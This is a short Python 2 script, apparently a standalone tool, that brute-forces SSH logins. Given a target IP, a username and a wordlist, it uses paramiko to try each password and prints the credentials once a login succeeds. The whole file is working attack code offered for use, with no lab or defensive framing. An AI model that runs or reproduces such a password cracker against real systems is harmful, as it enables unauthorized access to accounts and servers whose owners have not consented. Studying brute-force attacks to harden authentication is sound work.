# -*- coding: utf-8 -*-

import paramiko
import sys

class SSH(object):
    def __init__(self, ip, username, wordlist):
        self.ip = str(ip)
        self.username = str(username)
        self.wordlist = str(wordlist)
        self.senhas = []
        self.port = 22
        self.count = None

    def passlist(self):
        with open(self.wordlist) as passwords:
            for password in passwords.readlines():
                self.senhas.append(password.strip('\n'))

    def ssh_exec_test(self):
        self.passlist()
        self.count = len(self.senhas)

        print 'Cracking...\n'
        for password in self.senhas: 
            try:
                self.ssh = paramiko.SSHClient()
                self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.ssh.connect(self.ip, self.port, self.username, password)
                print 'YUUPP, password cracked !\nLogin: {}\nPassword: {}\n'.format(self.username, password)
                sys.exit()

            except paramiko.ssh_exception.AuthenticationException:
                self.count -= 1
                if( self.count == 0 ):
                    print 'Password not found!'
                    sys.exit()

                else:
                    pass
            
    def run(self):
        self.ssh_exec_test()

def main():
    if( len(sys.argv) < 4 ):
        print '+++ SSH cracker password +++\nUsage: python {} <ip> <username> <wordlist>\n'.format(sys.argv[0])
        sys.exit()

    else:
        ssh_connect = SSH(sys.argv[1], sys.argv[2], sys.argv[3])
        ssh_connect.run()

if( __name__ == '__main__' ):
    main()
